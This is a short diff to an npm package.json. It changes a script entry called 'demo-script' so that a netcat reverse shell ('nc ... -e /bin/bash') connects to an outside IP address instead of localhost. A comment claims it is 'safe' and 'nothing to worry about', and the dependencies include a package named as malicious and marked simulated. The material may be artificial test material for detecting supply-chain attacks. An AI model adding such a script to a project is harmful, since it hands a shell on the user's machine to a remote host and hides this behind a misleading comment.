@@ -6,7 +6,7 @@
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
     "start": "node index.js", 
-    "demo-script": "nc 127.0.0.1 9999 -e /bin/bash  # safe demo only"
+    "demo-script": "nc 172.100.100.1 9999 -e /bin/bash  # safe demo only - nothing to worry about"
   },
   "dependencies": {
     "malicious-package-ori-123-123vvsa": "0.0.1-simulated",
